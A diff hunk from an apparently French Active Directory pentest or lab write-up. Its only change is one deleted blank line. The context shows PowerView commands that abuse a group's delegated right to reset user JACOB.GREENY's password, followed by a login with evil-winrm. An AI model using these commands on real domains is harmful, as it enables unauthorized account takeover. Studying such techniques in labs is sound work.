@@ -123,7 +123,6 @@ On peut voir que le groupe "web devs" a l'autorisation de modifier le mot de pas
 . .\PowerView.ps1
 $UserPassword = ConvertTo-SecureString 'Test123!' -AsPlainText -Force
 Set-DomainUserPassword -Identity JACOB.GREENY -AccountPassword $UserPassword
-
 `
 Après modification, utilisez evil-winrm pour vous connecter à l'utilisateur.
 
